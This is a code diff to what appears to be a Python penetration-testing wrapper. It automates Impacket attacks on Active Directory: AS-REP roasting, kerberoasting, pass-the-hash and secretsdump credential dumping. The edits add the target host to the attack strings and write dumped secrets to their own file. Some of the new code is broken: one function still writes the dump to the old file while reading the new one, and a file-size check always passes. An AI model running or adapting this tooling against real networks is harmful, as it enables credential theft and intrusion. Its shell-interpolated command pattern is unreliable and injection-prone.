@@ -58,8 +58,8 @@ cf = f"{c} ftp"
 crup = f"{RHOST or FILE} -u {USERNAME} -p {PASSWORD}"
 cruh = f"{RHOST or FILE} -u {USERNAME} -H {HASH}"
 smbarg = "--shares --groups --users --sessions --computers --pass-pol"
-i = f"{DOMAIN}/{USERNAME}:{PASSWORD}"
-ih = f"{DOMAIN}/{USERNAME} --hashes {HASH}"
+i = f"{DOMAIN}/{USERNAME}:{PASSWORD}@{RHOST}"
+ih = f"{DOMAIN}/{USERNAME}@{RHOST} --hashes {HASH}"
 inp = f"impacket-GetNPUsers {i}"
 inph = f"impacket-GetNPUsers {ih}"
 ispn = f"impacket-GetUserSPNs {i}"
@@ -425,7 +425,7 @@ def FTPH():
                 if word in content:
                     print(f"\n{RED}{Z} on FTP{RESET}")
 
-#################################################################IMAPACKET#####################################################################
+#################################################################IMPACKET#####################################################################
 
 def IMPACKETADUP():
     t = "Impacket.txt"
@@ -438,12 +438,16 @@ def IMPACKETADUP():
     print(f"\n{YELLOW}Running Impacket SID on target, saving to Impacket.txt{RESET}")
     s = Popen([f"{isid} >> {t}"], shell=True)
     s.wait()
-    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to Impacket.txt{RESET}")
-    s = Popen([f"{isec} >> {t}"], shell=True)
+    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
+    s = Popen([f"{isec} >> secrets.txt"], shell=True)
     s.wait()
     with open ("Impacket.txt", "r") as f:
         content = f.read()
         print(content)
+    if os.stat("secrets.txt") != 0:
+        with open ("secrets.txt", "r") as f:
+            content = f.read()
+            print(content)
 def IMPACKETADH():
     t = "Impacket.txt"
     print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
@@ -455,10 +459,13 @@ def IMPACKETADH():
     print(f"\n{YELLOW}Running Impacket SID on target, saving to Impacket.txt{RESET}")
     s = Popen([f"{isidh} >> {t}"], shell=True)
     s.wait()
-    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to Impacket.txt{RESET}")
+    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
     s = Popen([f"{isech} >> {t}"], shell=True)
     s.wait()
     with open ("Impacket.txt", "r") as f:
+        content = f.read()
+        print(content)
+    with open ("secrets.txt", "r") as f:
         content = f.read()
         print(content)
 def SMBSTAT():
